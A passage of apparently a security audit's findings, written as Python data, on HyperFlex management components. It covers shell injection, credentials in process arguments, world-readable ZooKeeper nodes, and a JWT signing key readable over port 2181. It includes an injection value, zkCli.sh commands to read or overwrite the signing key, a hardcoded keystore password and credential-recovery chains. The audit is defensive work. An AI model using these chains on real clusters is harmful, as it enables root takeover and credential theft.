                "java.nio.file.Path normalizes '..' traversal but does NOT strip shell "
                "metacharacters (;, $(), backticks, |, etc.)."
            ),
            "shell_command_construction": (
                "StMgrImpl.$anonfun$installCatalogPkgOnNode$1(StMgrImpl, String, EntityRef): "
                "StringBuilder builds: 'dpkg -i --force-confold' + location_str + "
                "'/storfs-catalog_*.deb' (constant pool #44362, #44365). "
                "Offset 34: ldc 'dpkg -i --force-confold'; "
                "offset 40: aload_3 (location string); "
                "offset 44: ldc '/storfs-catalog_*.deb'. "
                "Built string passed to SshUtilsTrait.run(cmd, true, ...) at offset 104. "
                "SshUtilsTrait.run() executes via JSch SSH session on remote cluster node — "
                "the command string is interpreted by the remote shell."
            ),
            "upgrade_bundle_copy": (
                "StMgrImpl.$anonfun$upgradeServiceInt$89: "
                "'cp -v /opt/hyperflex/hxupgrade_bundle.tgz ' + file.getAbsolutePath() "
                "(location as java.io.File) executed via SshUtilsTrait.run(). "
                "'cp /opt/hyperflex/esxupgrade_bundle.zip ' + esxLocationStr also constructed. "
                "Both run over SSH to cluster nodes."
            ),
        },
        "impact": (
            "An authenticated caller with X-RootSessionID can invoke checkforUpgrade with "
            "location='/tmp/x; <cmd>' to inject arbitrary shell commands executed on remote "
            "cluster nodes via SSH. Since StMgr runs as root and SSH sessions to cluster nodes "
            "are root-authenticated (inter-node keys from ZK, see HX-F59), command injection "
            "achieves root code execution on all target nodes in the cluster. "
            "Authentication gate: X-RootSessionID required (reduces pre-requisites to prior "
            "auth compromise, e.g., via HX-F55 JWT forgery)."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Validate location against an allowlist (absolute path, no shell metacharacters: "
            "use regex [a-zA-Z0-9/_.-]+ with length limit). "
            "2. Pass commands via exec(String[]) array form instead of shell string concatenation "
            "— eliminates shell metacharacter interpretation entirely. "
            "3. Validate checksum of the upgrade bundle before processing the location path. "
            "4. Log checkforUpgrade invocations with caller identity and location value."
        ),
    },

    # ── HX-F62 ──────────────────────────────────────────────────────────────────
    "HX-F62": {
        "title": "ESX and UCS Credentials Passed as Command-Line Arguments to Ansible (Process Table Exposure)",
        "severity": "MEDIUM",
        "cvss": "5.5",
        "cwe": "CWE-214",
        "component": "StMgrImpl / upgradeVibsOnHost / Ansible invocation",
        "class": "Credentials in Process Arguments",
        "confirmed": True,
        "evidence": {
            "command_construction": (
                "StMgrImpl.$anonfun$upgradeVibsOnHost$6(StMgrImpl, String, String, String, "
                "SshUtilsTrait, Component): "
                "StringBuilder builds ansible-playbook command (offset 64): "
                "'ansible-playbook -i localhost ' + STORFS_MISC_SCRIPT_DIR + PRE_VIB_UPGRADE_SCRIPT "
                "+ ' -e target_host_ip=' + aload_1 (IP) "
                "+ ' -e vib=' + vib "
                "+ ' -e esx_user=' + aload_2 (username) "
                "+ ' -e esx_password=' + getEncodedPassword(aload_3) (password). "
                "Constant pool #43563: 'ansible-playbook -i localhost'; "
                "#43569: ' -e esx_user='; #43571: ' -e esx_password='. "
                "Log string (offset 197): UPGRADE: pre vib script to remove required vib with command = "
                "— password REDACTED in log (#43577: 'esx_password=######') but FULL VALUE "
                "present in the actual command string used for execution."
            ),
            "process_exposure": (
                "Command is passed to SshUtilsTrait.run() which executes via JSch or local exec. "
                "Process arguments are visible in /proc/<pid>/cmdline to all local users "
                "and in 'ps auxww' output. Duration depends on ansible-playbook execution time "
                "(typically 10-60 seconds for VIB operations). "
                "getEncodedPassword() may URL-encode or base64 the password, but the "
                "encoded form is directly usable with ansible-vault or the raw credential "
                "can be recovered trivially."
            ),
            "affected_credentials": (
                "ESX root password (esx_password) — used for all VIB upgrade operations. "
                "ESX username (esx_user) — typically 'root'. "
                "Same pattern confirmed in upgrade payload validation flow."
            ),
        },
        "impact": (
            "Any local user on a HyperFlex controller VM can recover ESX host credentials "
            "by polling /proc or 'ps auxww' during a cluster upgrade operation. "
            "ESX root credentials allow full hypervisor access, VM exfiltration, and "
            "storage layer manipulation outside the HyperFlex management plane. "
            "Combined with HX-F60 (keystore exposure), attack does not require upgrade timing — "
            "the keystore path directly exposes the ESX encrypted password from ZK."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Pass ESX credentials via a temp file (mode 0600) or stdin instead of "
            "command-line arguments: ansible-playbook -e @credentials_file.yml. "
            "2. Delete the credentials file immediately after ansible-playbook exits. "
            "3. Use ansible-vault encrypted variables for credential storage. "
            "4. Audit all ansible-playbook invocations across StMgrImpl for the same pattern."
        ),
    },

    "HX-F63": {
        "title": "Dead Code: whitelistCommands Field in HXSecuritySvcMgrImpl Never Enforced",
        "severity": "LOW",
        "cvss": "2.5",
        "cwe": "CWE-1164",
        "component": "hxSecuritySvcMgr-1.0.jar / HXSecuritySvcMgrImpl",
        "class": "Abandoned Security Control",
        "confirmed": True,
        "evidence": {
            "field_declaration": (
                "HXSecuritySvcMgrImpl constructor (offset 10-29): "
                "iconst_1 / anewarray String / ldc 'dpkg' / aastore / Arrays.asList() / "
                "HashSet.<init>(Collection) / putfield whitelistCommands — "
                "whitelistCommands = HashSet{\"dpkg\"}. "
                "Offset 32-42: iconst_1 / anewarray String / ldc 'storfs-se-core' / aastore / "
                "putfield allowedPkgPrefix — allowedPkgPrefix = String[]{\"storfs-se-core\"}."
            ),
            "never_read": (
                "javap -private -c output: only 'putfield #28 // Field whitelistCommands' and "
                "'putfield #34 // Field allowedPkgPrefix' appear in the entire class. "
                "No 'getfield #28' or 'getfield #34' present anywhere. "
                "Neither field is read in runCommand(), installPackage(), "
                "containsSensitiveArgs(), getReplacement(), or any other method. "
                "Both fields are written once at construction time and never consulted again."
            ),
            "actual_enforcement": (
                "Whitelist enforcement delegated entirely to CommandValidatorUtil.validateCommand() "
                "which maintains a hardcoded 34-entry switch table: "
                "stcli, service, iptables, storfs-support, service_status.sh, rescan-scsi-bus, "
                "restart, stop, start, ip, fping, dpkg, "
                "/usr/share/secureshell-config/enable_secureshell.sh, bom-check.sh, "
                "hyperflex, springpath, ifdown, ifup, sendasup, sendsch, "
                "hxWindowsAgentLoggingWrapper, nfstool, "
                "/opt/hyperflex/storfs-support/secure_disk_erase_internal.py, limit-lshell, "
                "hxdpservices, /usr/share/hyperflex/storfs-misc/relinquish_node.py, "
                "/opt/hyperflex/storfs-support/getEsxConnectionInfo.sh, "
                "/usr/share/hyperflex/storfs-misc/hx-scripts/certificate_import_input_internal.sh, "
                "/usr/share/hyperflex/storfs-misc/ntpsync.sh, /sbin/poweroff, fdisk, smartctl, "
                "asupcli, /opt/springpath/storfs-support/get-stprocfs.sh. "
                "Default case throws Exception (command rejected)."
            ),
        },
        "impact": (
            "The abandoned whitelistCommands field suggests an intent to restrict commands "
            "at the class level that was refactored out or never wired up. "
            "The per-class whitelist {'dpkg'} bears no relation to the 34-command "
            "CommandValidatorUtil whitelist. If future refactoring removes CommandValidatorUtil "
            "validation while the dead whitelistCommands field is mistakenly assumed to still "
            "enforce restrictions, runCommand() would accept arbitrary commands."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Remove the dead whitelistCommands and allowedPkgPrefix fields from "
            "HXSecuritySvcMgrImpl or wire them into the validation path. "
            "Consolidate command validation into a single enforceable control. "
            "Add a unit test that verifies CommandValidatorUtil.validateCommand() "
            "throws on any command not in the explicit whitelist."
        ),
    },

    "HX-F64": {
        "title": "validateStcli Uses Blocklist Instead of Allowlist — Arbitrary stcli Subcommands Permitted",
        "severity": "MEDIUM",
        "cvss": "5.3",
        "cwe": "CWE-184",
        "component": "hxSecuritySvcMgr-1.0.jar / CommandValidatorUtil.validateStcli",
        "class": "Incomplete Blocklist",
        "confirmed": True,
        "evidence": {
            "validateStcli_bytecode": (
                "CommandValidatorUtil.validateStcli(List<String>) at offset 0-81: "
                "iconst_2 / anewarray / ldc 'cleaner' / aastore / ldc 'rebalance' / aastore / "
                "Arrays.asList() → blockedList. "
                "blockedList.contains(args.get(0)) → ifeq 82 (return). "
                "If args[0] IS in {'cleaner', 'rebalance'}: fall through to athrow (Exception). "
                "If args[0] is NOT in {'cleaner', 'rebalance'}: return (passes validation). "
                "Any stcli subcommand except 'cleaner' and 'rebalance' passes."
            ),
            "call_path": (
                "runCommand(cmd='stcli', args=['cluster','reregister']) → "
                "CommandValidatorUtil.validate('stcli cluster reregister') → "
                "validateCommand(fullStr) → split on space → cmd='stcli' → "
                "case 0 in tableswitch → validateStcli(['cluster','reregister']). "
                "args[0]='cluster' not in {'cleaner','rebalance'} → returns (passes). "
                "ProcBuilder('stcli', ['cluster','reregister']).run() executes."
            ),
            "sensitive_args_redaction": (
                "containsSensitiveArgs('stcli', ['cluster','reregister']) returns true "
                "(case 2 in switch, offset 120-175: args.size()>=2 && args[0]=='cluster' "
                "&& args[1]=='reregister'). This only redacts args from logs. "
                "The command still executes with all args."
            ),
            "stcli_impact": (
                "stcli is the HyperFlex cluster CLI. Unrestricted subcommands include: "
                "stcli cluster info, stcli node list, stcli security passwd, "
                "stcli dp snapshot, stcli dp clone, stcli network set, "
                "stcli license set — all executable via authenticated Thrift runCommand()."
            ),
        },
        "impact": (
            "An attacker with a valid X-RootSessionID token can invoke any stcli subcommand "
            "except 'cleaner' and 'rebalance' through hxSecuritySvcMgr.runCommand(). "
            "This includes stcli commands that change cluster configuration, network settings, "
            "credentials, snapshots, and licensing. "
            "Blocklist design guarantees bypass by any subcommand added after the list was written."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace the blocklist with an explicit allowlist of permitted stcli subcommands. "
            "Enumerate every stcli subcommand that runCommand() callers legitimately need, "
            "add each to an allowlist Set, and reject anything not in the set. "
            "Apply the same allowlist-over-blocklist principle to all other "
            "CommandValidatorUtil.validateXxx() methods that use no arg validation."
        ),
    },

    "HX-F65": {
        "title": "Hyper-V Host Credentials Recoverable from World-Readable ZooKeeper Nodes (stSSOMgr)",
        "severity": "HIGH",
        "cvss": "7.5",
        "cwe": "CWE-312",
        "component": "stSSOMgr-1.0.jar / StSSOMgrImpl / ZK path /stSSOMgr/auth",
        "class": "Credentials in Unprotected Storage",
        "confirmed": True,
        "evidence": {
            "zk_layout": (
                "StSSOMgrImpl$.MODULE$.zkAuthKey() = '/stSSOMgr/auth' (from application.conf). "
                "StSSOMgrImpl$.MODULE$.zkEncryptionKey() = 'keyData'. "
                "StSSOMgrImpl$.MODULE$.zkCredsKey() = 'creds'. "
                "ZkPersistenceManager.write(zkAuthKey, zkEncryptionKey, base64EncodedKey, -1L): "
                "stores AES session encryption key at ZK node /stSSOMgr/auth under field 'keyData'. "
                "ZkPersistenceManager.write(zkAuthKey, zkCredsKey, encryptedHypervCreds, ttl): "
                "stores encrypted Hyper-V credentials at ZK node /stSSOMgr/auth under field 'creds'."
            ),
            "key_generation": (
                "getEncryptionKeyFromZK$3 (offset 12-27): "
                "EncryptionUtil$.generateSecretKey() → secretKey.getEncoded() → "
                "Base64.encodeBase64String(keyBytes) → stored as-is in ZK under 'keyData'. "
                "getEncryptionKeyFromZK$2 (offset 88-116): on read: "
                "Base64.decodeBase64(keyDataFromZK.getBytes()) → "
                "new SecretKeySpec(bytes, 0, len, ENCRYPTION_KEY_ALGORITHM). "
                "No additional protection beyond base64 encoding."
            ),
            "credential_encryption": (
                "setHypervHostCreds$3 (offset 79-87): "
                "EncryptionUtil$.encryptData(hypervPassword, aesKeyFromZK) → encryptedStr. "
                "setHypervHostCreds$5 (offset 40-60): "
                "ZkPersistenceManager.write(zkAuthKey='/stSSOMgr/auth', zkCredsKey='creds', "
                "encryptedStr, ttlMillis). "
                "Both keyData (AES key) and creds (encrypted with that key) stored in the "
                "same ZK node /stSSOMgr/auth with OPEN_ACL_UNSAFE (world:anyone:cdrwa, HX-F55). "
                "EncryptionUtil$.decryptData() uses the same AES key for decryption."
            ),
            "zk_acl": (
                "Per HX-F55: ZooKeeper curator client at /etc/hyperflex/secure/zookeeper.properties "
                "never calls withACL() — all nodes created with OPEN_ACL_UNSAFE. "
                "zkctl (or any unauthenticated ZK client on port 2181) can read "
                "/stSSOMgr/auth/keyData and /stSSOMgr/auth/creds without credentials. "
                "Combined recovery: read keyData → base64-decode → AES key → "
                "decrypt creds → plaintext Hyper-V password."
            ),
        },
        "impact": (
            "Any process or user with ZooKeeper access (port 2181) on the stCtlVM network "
            "can recover Hyper-V host credentials without authentication. "
            "Hyper-V credentials provide full access to the Windows hypervisor hosting HyperFlex "
            "nodes in Hyper-V deployment scenarios: VM lifecycle control, storage access, "
            "and lateral movement to all workloads on the Hyper-V cluster. "
            "Combined with HX-F55 (ZK OPEN_ACL_UNSAFE), this requires no prior privileges."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Apply ZooKeeper ACLs to /stSSOMgr/auth (digest ACL, stSSOMgr service account only). "
            "2. Store the AES encryption key outside ZooKeeper — in the JCEKS keystore at "
            "/etc/hyperflex/secure/hyperflex_keystore.jceks (already used by EncryptionUtil$). "
            "3. If credentials must be in ZK, use envelope encryption: encrypt the AES key "
            "with the keystore-resident vcenter_client private key before storing in ZK. "
            "4. Rotate Hyper-V credentials on any system where this ZK path was readable."
        ),
    },

    "HX-F66": {
        "title": "ESX/vCenter/ctlvm Passwords Passed as Base64-Encoded Command-Line Arguments (stDeploy)",
        "severity": "MEDIUM",
        "cvss": "5.5",
        "cwe": "CWE-214",
        "component": "stDeploy-1.0.jar / StDeployImpl / getEncodedPassword / secureboot script invocation",
        "class": "Sensitive Information in Process Arguments",
        "confirmed": True,
        "evidence": {
            "getEncodedPassword_impl": (
                "StDeployImpl.getEncodedPassword(String pw) at offset 0-22: "
                "pw.getBytes() -> Base64.encodeBase64String([B) -> new String(encoded). "
                "Apache Commons Codec Base64 — standard encoding, NOT encryption, trivially reversible."
            ),
            "arg_construction": (
                "Bytecode offset 64-185 in secureboot script method: "
                "String[9] = [scriptPath, '--ctlvmIp', ctlvmIp, '--ctlvmPassword', "
                "getEncodedPassword(ctlvmPassword), '--esxPassword', "
                "getEncodedPassword(esxPassword.getOrElse('')), '--esxHosts', esxHostsCsv]. "
                "Array passed to Seq.apply() then stringSeqToProcess() — "
                "scala.sys.process.Process with args as separate tokens (no shell). "
                "ProcessBuilder.lines() invoked — subprocess spawned with these argv tokens."
            ),
            "process_table_exposure": (
                "Subprocess argv is readable via /proc/<pid>/cmdline (null-delimited). "
                "ps(1) output includes full argv. Process audit logs (auditd execve) capture argv. "
                "Base64 decode: echo '<encoded>' | base64 -d recovers plaintext password. "
                "Three credential classes exposed: ESX root password (--esxPassword), "
                "vCenter password (--vCenterPassword, also Base64 via getEncodedPassword at "
                "offsets 86-103 and 97-115), ctlvm admin password (--ctlvmPassword)."
            ),
            "scope": (
                "Pattern appears in at least two method bodies in StDeployImpl "
                "(secureboot script method and addNodes path, offsets ~6388 and ~6953). "
                "All three credential types encoded identically — same getEncodedPassword call."
            ),
        },
        "impact": (
            "Any process on the stCtlVM management node with /proc read access (default on Linux) "
            "can recover ESX root, vCenter, and Controller VM passwords during active "
            "cluster deployment or node-add operations. "
            "ESX root compromise allows hypervisor-level control of all HyperFlex nodes. "
            "vCenter compromise enables full virtualization management plane access. "
            "ctlvm password grants access to the HyperFlex storage controller."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Use environment variables or a credential store (e.g., the JCEKS keystore) "
            "to pass passwords to deployment scripts — not command-line arguments. "
            "2. If args are required, use a named pipe or stdin pipe to the script. "
            "3. Apply PR_SET_DUMPABLE=0 and restrict /proc/<pid> visibility for the deployment service. "
            "4. Rotate ESX, vCenter, and ctlvm credentials after any deployment operation."
        ),
    },

    "HX-F67": {
        "title": "Passphrase-less RSA Key Regeneration Silently Overwrites /root/.ssh/id_rsa (stDeploy)",
        "severity": "HIGH",
        "cvss": "7.1",
        "cwe": "CWE-321",
        "component": "stDeploy-1.0.jar / StDeployImpl / $anonfun$regenerateKeys$1 / $anonfun$enableSecureShell$1",
        "class": "Unprotected Credentials / Key Management Failure",
        "confirmed": True,
        "evidence": {
            "regenerateKeys_impl": (
                "$anonfun$regenerateKeys$1 bytecode (offset 0-50): "
                "Seq('/bin/bash', '-c', "
                "'/usr/bin/yes y | ssh-keygen -m PEM -t rsa -N \"\" -f /root/.ssh/id_rsa -q').!! "
                "Flags: -N \"\" (empty passphrase), -f /root/.ssh/id_rsa (fixed output path), "
                "-q (quiet, no stderr output). "
                "'/usr/bin/yes y |' pipes 'y\\ny\\n...' to ssh-keygen overwrite prompt — "
                "existing /root/.ssh/id_rsa unconditionally destroyed without backup. "
                "Result is PEM RSA private key with no passphrase at /root/.ssh/id_rsa."
            ),
            "key_usage": (
                "$anonfun$enableSecureShell$1 bytecode (offset 31-76): "
                "Seq('/bin/bash', '-c', "
                "'ssh -i /root/.ssh/id_rsa root@' + hostIp + "
                "' /usr/share/secureshell-config/enable_secureshell.sh').!! "
                "Key at /root/.ssh/id_rsa used for root@<esxHost> SSH — "
                "authorizes the management node to run commands as root on all ESX hosts. "
                "Key is implicitly trusted across the full cluster."
            ),
            "no_passphrase": (
                "Private key stored at /root/.ssh/id_rsa with -N \"\" (no passphrase). "
                "/root/.ssh/ permissions are 700 by default on Linux, but the file itself "
                "is 600 — readable by root processes. Any root-level process or SUID binary "
                "on the stCtlVM can read and use the key. "
                "Key loss (theft, backup, coredump, snapshot) directly enables root SSH "
                "to all ESX hosts in the cluster."
            ),
            "overwrite_behavior": (
                "'/usr/bin/yes y |' ensures ssh-keygen answers 'y' to 'Overwrite (y/n)?'. "
                "Prior key (if any, e.g., manually configured or from a previous deploy) "
                "is destroyed with no notification. "
                "authorized_keys on ESX hosts is updated separately — if the old public key "
                "remains in authorized_keys after regeneration, the new private key will "
                "not work until authorized_keys is also updated."
            ),
        },
        "impact": (
            "1. Key confidentiality: passphrase-less private key stored on management node — "
            "any root-level process (including attacker with HX-F01 command injection) "
            "can extract and reuse it to authenticate as root to all cluster ESX hosts. "
            "2. Key integrity: silent overwrite destroys prior key without backup, "
            "potentially breaking existing admin automation or leaving stale public keys "
            "in ESX authorized_keys (authorized_keys drift). "
            "3. Combined with HX-F55/HX-F65: attacker who reads ZK for Hyper-V creds "
            "also gains passphrase-less SSH to ESX hosts via /root/.ssh/id_rsa, "
            "yielding hypervisor root across the full cluster."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Generate the key with a passphrase and store it in a secrets manager "
            "or the JCEKS keystore — load at runtime via ssh-agent or keystore API. "
            "2. If passphrase-less is required for automation, restrict /root/.ssh/id_rsa "
            "permissions to 0400 and ensure the management node's root account is "
            "only accessible through audited channels. "
            "3. Before regenerating, archive the existing key to a secure backup location. "
            "4. After regeneration, atomically update all ESX host authorized_keys entries "
            "before the old private key is destroyed."
        ),
    },

    "HX-F68": {
        "title": "stNodeMgr Session Token Derived from Public Key File via Shell Subprocess",
        "severity": "LOW",
        "cvss": "3.3",
        "cwe": "CWE-798",
        "component": "stNodeMgr-1.0.jar / StNodeMgrImpl / $anonfun$sessionToken$1",
        "class": "Hardcoded/Static Credential",
        "confirmed": True,
        "evidence": {
            "token_init": (
                "$anonfun$sessionToken$1 bytecode (offset 0-17): "
                "scala.sys.process.stringToProcess('cat /etc/hyperflex/secure/root_file.pub').!! .trim "
                "— string-mode shell execution (no Seq wrapping), string passed to /bin/sh -c. "
                "Result stored in StNodeMgrImpl.sessionToken field at constructor offset 143-169: "
                "Try { $anonfun$sessionToken$1() }.toOption.getOrElse($anonfun$sessionToken$2()). "
                "Fallback ($anonfun$sessionToken$2): returns literal String 'invalid-token' on any failure."
            ),
            "token_usage": (
                "sessionToken field (putfield #927) is set once at construction time. "
                "Used as X-RootSessionID header in outgoing internal Thrift calls from stNodeMgr "
                "to hxdp services (hxSecuritySvcMgr, hxdprestintServer). "
                "Token = contents of /etc/hyperflex/secure/root_file.pub — a public key file "
                "(.pub suffix), not a secret. Public key material is not secret by design."
            ),
            "fallback_token": (
                "If /etc/hyperflex/secure/root_file.pub is absent or unreadable, "
                "sessionToken = 'invalid-token' (hardcoded literal). "
                "If the receiving service validates X-RootSessionID against the same file, "
                "an absent root_file.pub causes all stNodeMgr Thrift calls to fail "
                "with invalid-token — silent degradation of authentication."
            ),
        },
        "impact": (
            "The auth token for stNodeMgr-to-hxdp service calls is based on a PUBLIC key file. "
            "Any process that can read /etc/hyperflex/secure/root_file.pub obtains the token "
            "and can impersonate stNodeMgr to internal services. "
            "The fallback to 'invalid-token' means authentication silently degrades if the file "
            "is deleted or permissions are wrong, potentially blocking cluster operations "
            "with no explicit error for the missing credential source."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Replace the static public-key-based token with a private secret "
            "(e.g., a per-boot HMAC-SHA256 token stored in a tmpfs, or a short-lived JWT "
            "signed by the keystore-resident private key at /etc/hyperflex/secure/hyperflex_keystore.jceks). "
            "2. If the root_file.pub approach is retained, move token validation to a challenge-response "
            "scheme where the server challenges with a nonce and stNodeMgr signs with its private key. "
            "3. Remove the 'invalid-token' fallback — fail-closed, not fail-open on missing credentials."
        ),
    },

    "HX-F70": {
        "title": "ESX, vCenter, and UCSM Credentials Stored as AES-Encrypted Blobs in World-Readable ZK Nodes (ZKNodeService_StMgr)",
        "severity": "HIGH",
        "cvss": "8.1",
        "cwe": "CWE-312",
        "component": "stMgr-1.0.jar / ZKNodeService_StMgr / EsxAuthZKMgmtImpl / ZKEntryConstants",
        "class": "Credentials in Unprotected Storage",
        "confirmed": True,
        "evidence": {
            "zk_fields": (
                "ZKEntryConstants defines these ZK credential fields: "
                "'esx_username', 'esx_password' (ESX service account), "
                "'url_vcenter_encrypted_user', 'url_vcenter_encrypted_password' (vCenter admin), "
                "'ucsm_user', 'ucsm_pwd' (UCS Manager admin). "
                "All stored via ZKNodeService_StMgr.setEsxCredentials(user, pass), "
                "setVCenterEncryptedUser()/setVCenterEncryptedPassword(), "
                "setUcsmEncryptedUser()/setUcsmEncryptedPassword()."
            ),
            "encryption": (
                "EsxAuthZKMgmtImpl.setEsxCredentialsToZK(String user, String pass): "
                "EncryptionUtil$.encryptData(user) → encryptedUser; "
                "EncryptionUtil$.encryptData(pass) → encryptedPass; "
                "zkSvc_Mgr.setEsxCredentials(encryptedUser, encryptedPass). "
                "EsxAuthZKMgmtImpl.getEsxCredentialsFromZK(): "
                "zkSvc_Mgr.getEsxCredentials() → (encUser, encPass); "
                "EncryptionUtil$.decryptData(encUser) → plainUser; "
                "EncryptionUtil$.decryptData(encPass) → plainPass. "
                "EncryptionUtil$ uses symmetric AES with key from JCEKS keystore. "
                "JCEKS keystore password = 'springpath' (hardcoded, HX-F58)."
            ),
            "zk_acl": (
                "Per HX-F55: ZooKeeper curator client never sets ACLs — "
                "all nodes created with OPEN_ACL_UNSAFE (world:anyone:cdrwa). "
                "Any unauthenticated ZK client on port 2181 can read all credential fields. "
                "Per HX-F69: ZK client auth (UUID token scheme) cannot be enabled via config — "
                "Boolean.getBoolean API misuse permanently disables it."
            ),
            "recovery_chain": (
                "1. zkctl (or any ZK client) reads esx_username, esx_password fields. "
                "2. Load /etc/hyperflex/secure/hyperflex_keystore.jceks with password 'springpath'. "
                "3. Extract AES key from keystore (EncryptionUtil key alias). "
                "4. AES-decrypt both ciphertext blobs → plaintext ESX service account credentials. "
                "Repeat for url_vcenter_encrypted_user/password and ucsm_user/ucsm_pwd. "
                "Five credential pairs (ESX user, ESX pass, vCenter user, vCenter pass, "
                "UCSM user, UCSM pass) all recoverable via the same keystore key."
            ),
        },
        "impact": (
            "Attacker with ZooKeeper port 2181 access recovers plaintext credentials for: "
            "(1) ESX service account — root-equivalent access to all HyperFlex ESXi nodes; "
            "(2) vCenter administrator account — full virtualization management plane control "
            "(create/destroy/migrate VMs, snapshot, network policy); "
            "(3) UCS Manager administrator account — complete UCS fabric control "
            "(blade server chassis, fabric interconnects, policies, firmware, pools). "
            "Three infrastructure layers compromised from a single unauthenticated ZK read."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "1. Apply ZooKeeper node ACLs to all credential-holding paths "
            "(digest ACL, stMgr service account only). "
            "2. Store the encryption key outside ZooKeeper and outside the keystore that uses "
            "a hardcoded password — use a hardware security module or OS-native secret store. "
            "3. Use distinct encryption keys per credential class. "
            "4. Rotate ESX, vCenter, and UCSM credentials immediately on any affected system. "
            "5. Fix ZK client auth (HX-F69) to prevent unauthenticated connections."
        ),
    },

    "HX-F69": {
        "title": "ZK Client Auth Permanently Disabled Due to Boolean.getBoolean(value) API Misuse (ZkConnectionManager)",
        "severity": "LOW",
        "cvss": "3.1",
        "cwe": "CWE-670",
        "component": "zkClusterManager-1.0.jar / ZkConnectionManager / setAuthToken",
        "class": "Incorrect Implementation — ZK Auth Inoperative",
        "confirmed": True,
        "evidence": {
            "misuse": (
                "ZkConnectionManager.setAuthToken() bytecode (offset 10-16): "
                "String useZkAuthStr = GenericZkUtil.getPropertyFromStorfsCfg('useZkAuth', 'false'); "
                "boolean useZkAuth = Boolean.getBoolean(useZkAuthStr). "
                "Java.lang.Boolean.getBoolean(name) = Boolean.parseBoolean(System.getProperty(name)). "
                "When storfs.cfg has 'useZkAuth=true': "
                "  useZkAuthStr = 'true'; "
                "  Boolean.getBoolean('true') = Boolean.parseBoolean(System.getProperty('true')); "
                "  System.getProperty('true') = null (not a standard JVM property); "
                "  result = false. Auth disabled regardless of storfs.cfg value. "
                "Intended API: Boolean.parseBoolean(useZkAuthStr), not Boolean.getBoolean(useZkAuthStr)."
            ),
            "default_disabled": (
                "When storfs.cfg is absent: getPropertyFromStorfsCfg returns default 'false'. "
                "Boolean.getBoolean('false') = Boolean.parseBoolean(System.getProperty('false')) = false. "
                "When storfs.cfg has useZkAuth=false: same result. "
                "When storfs.cfg has useZkAuth=true: Boolean.getBoolean('true') = false (bug). "
                "Only way to enable: start JVM with -DuseZkAuth=true system property "
                "AND have storfs.cfg with useZkAuth=useZkAuth (self-referential). "
                "Not documented; no admin can enable ZK auth via the intended config path."
            ),
            "consequence": (
                "Client ZK authentication (addAuthInfo UUID scheme) is permanently disabled — "
                "any process on the stCtlVM network can connect to ZooKeeper port 2181 "
                "and read/write nodes without credentials. "
                "Compounds HX-F55 (OPEN_ACL_UNSAFE): even if ACLs were fixed, "
                "the ZK client auth token would not be attached to curator connections. "
                "The skipZkAuthOnFailure=false default is a dead code path — "
                "the auth failure branch (offset 121-172) is never reached."
            ),
        },
        "impact": (
            "ZK client authentication cannot be enabled via storfs.cfg configuration. "
            "Administrators who believe they have enabled ZK auth by setting useZkAuth=true "
            "in storfs.cfg have no protection — the config is silently ignored. "
            "Combined with HX-F55 (OPEN_ACL_UNSAFE), all ZK nodes remain unauthenticated "
            "and world-readable/writable regardless of configuration."
        ),
        "versions_affected": ["6.0.2b-44423"],
        "remediation": (
            "Replace Boolean.getBoolean(useZkAuthStr) with Boolean.parseBoolean(useZkAuthStr) "
            "in ZkConnectionManager.setAuthToken(). "
            "After the fix, validate that setting useZkAuth=true in storfs.cfg causes "
            "addAuthInfo to be called with the cluster UUID token before each curator operation."
        ),
    },
    "HX-F71": {
        "title": "JWT Signing Key Stored in World-Readable/Writable ZK Path /rest/aaa/jwt_signing_key",
        "severity": "CRITICAL",
        "cvss": "9.8",
        "cwe": "CWE-321",
        "component": "hx-aaa / AAAStoreZKPersistAgent / setIfAbsentJWTSigningKey + fetchJWTSigningKey",
        "class": "Cryptographic Key Exposure — Symmetric JWT Signing Key in Unauthenticated ZK",
        "confirmed": True,
        "evidence": {
            "zk_path": (
                "AAAStoreZKPersistAgent.class constant pool ldc #42: String '/rest/aaa/jwt_signing_key'. "
                "Private field AAAJWTSigningKey holds this path. "
                "fetchJWTSigningKey() reads via ZooKeeperStore.getValueForKey('/rest/aaa/jwt_signing_key'). "
                "setIfAbsentJWTSigningKey() writes via ZooKeeperStore.setValueForKeyForVersion("
                "'/rest/aaa/jwt_signing_key', value, -1) — version -1 = unconditional write. "
                "Additional ZK paths: /rest/aaa/auth_order, /rest/aaa/failed_logins_table, "
                "/rest/aaa/auth_window_size_in_mins, /rest/aaa/max_authentications_allowed_in_window."
            ),
            "open_acl_chain": (
                "ZK node /rest/aaa/jwt_signing_key created under OPEN_ACL_UNSAFE (world:anyone:cdrwa) "
                "as established in HX-F55 (ZkConnectionManager uses OPEN_ACL_UNSAFE for all node creation; "
                "auth disabled via HX-F69 Boolean.getBoolean misuse). "
                "Any process on the stCtlVM network (TCP 2181) can: "
                "  (1) READ the signing key via zkCli.sh get /rest/aaa/jwt_signing_key "
                "  (2) WRITE a replacement key via zkCli.sh set /rest/aaa/jwt_signing_key <attacker-key> "
                "No ZK auth credential required due to HX-F55 + HX-F69."
            ),
            "jwt_usage": (
                "SSOManager.validateAccessTokenConvertToJWT(token, user, ssoUrl) validates all "
                "HyperFlex Connect REST API tokens using the key fetched from /rest/aaa/jwt_signing_key. "
                "SSOManager.authenticateAndFetchEncryptedJWT() signs new tokens with the same key. "
                "Single key for both sign and verify = symmetric algorithm (HMAC-SHA). "
                "JsonWebTokenImpl.formatToken/parseToken: JWT payload contains fields "
                "user, token, session, scope, issuedAt, tokenLifeTime, idleTimeout, "
                "warnIdleTimeout, hypervisor — full session context."
            ),
            "exploit_path": (
                "Read-key path: attacker on network reads /rest/aaa/jwt_signing_key from ZK port 2181. "
                "Crafts HMAC-signed JWT with user='admin', scope='admin', any valid issuedAt/tokenLifeTime. "
                "Presents forged token to HyperFlex Connect REST API — passes SSOAuthFilterImpl validation. "
                "Full admin API access without credentials. "
                "Write-key path: attacker writes attacker-controlled key to /rest/aaa/jwt_signing_key. "
                "All subsequent legitimate tokens become invalid (DoS); attacker issues valid tokens. "
